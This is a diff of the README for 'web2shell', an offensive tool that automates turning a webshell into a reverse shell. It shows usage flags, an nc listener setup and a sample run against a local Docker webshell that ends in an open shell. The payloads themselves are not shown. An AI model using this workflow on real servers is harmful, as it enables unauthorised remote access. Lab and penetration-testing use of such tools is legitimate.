@@ -7,7 +7,7 @@ Credit for the reverse shells goes to [PayloadAllTheThings.](https://github.com/
 ## Usage
 
 ```
-usage: web2shell [-h] [-i INTERFACE] [--force] [--ip IP] [--port PORT] [--nc NC] url
+usage: web2shell [-h] [-i INTERFACE] [--force] [--ip IP] [--port PORT] [--nc NC] [--verbose] url
 
 Automate converting webshells into reverse shells.
 
@@ -22,15 +22,16 @@ options:
   --ip IP               IP address of your own listener (skips listener setup if both IP and port are set)
   --port PORT           port of your own listener
   --nc NC               path to local nc binary
+  --verbose             verbose command output
 ```
 
-The only **required** flag is the `url.`
+Providing an IP and port will cause the program to skip the listener setup and assume you already have netcat/a comparable listener running at that address.
 
 Please note: this program currently is only intended to be used on and against Linux machines.
 
 ## Requirements
 
-Install the required python modules with pip (`pip3 install -r requirements.txt`.) You will need a local copy of `nc`. The program will attempt to find it automatically. If it can't, please specify the path with the `--nc` flag.
+Install the required python modules with pip (`pip3 install -r requirements.txt`.) You will need a local copy of `nc`. The program will attempt to find it automatically. If it can't (it might not be in your `$PATH`), please specify the path to the binary with the `--nc` flag.
 
 ## Adding New Payloads
 
@@ -45,7 +46,7 @@ The included payloads have all been tested on a simple webshell and work. If you
 Example execution on local Docker image (see `demo/README.md`)
 
 ```
-[evan@ejedev web2shell]$ python3 web2shell.py  --url http://127.0.0.1:8080/cmd.php?cmd=SHELL --interface docker0
+[evan@ejedev web2shell]$ python3 web2shell.py -i docker0 http://127.0.0.1:8080/cmd.php?cmd=SHELL
 
                o                  o           o  o
                O     .oOOo.       O           O  O
@@ -66,25 +67,29 @@ Available interfaces...
 [-] br-7436527ee366
 [-] br-aa3534e13396
 [-] br-c7551daa06d2
-[-] veth87ee241
+[-] veth148b75b
 docker0 selected. Address to use is 172.17.0.1
 Testing ports...
-[-] 1025 available!
+[x] 1025 already in use or unavailable.
+[-] 1026 available!
 Finding local nc binary...
 nc target at /usr/bin/nc
-Final connection string will be 172.17.0.1:1025...
+Final connection string will be 172.17.0.1:1026...
 Finding bins...
 Ncat: Version 7.93 ( https://nmap.org/ncat )
-Ncat: Listening on :::1025
-Ncat: Listening on 0.0.0.0:1025
+Ncat: Listening on :::1026
+Ncat: Listening on 0.0.0.0:1026
 [-] perl found at /usr/bin/perl
 [-] perl found at /usr/bin/perl5.32-x86_64-linux-gnu
 [-] php found at /usr/local/bin/php
 [-] python found at /usr/bin/python3.9
+[-] ruby found at /usr/bin/ruby2.7
+[-] ruby found at /usr/bin/ruby
+[-] go found at /usr/bin/go
 Executing reverse shell...
-Bins to test: 4
+Bins to test: 7
 [!] Attempting perl payloads for path /usr/bin/perl
 Ncat: Connection from 172.17.0.2.
-Ncat: Connection from 172.17.0.2:54256.
+Ncat: Connection from 172.17.0.2:38870.
 $
 ```
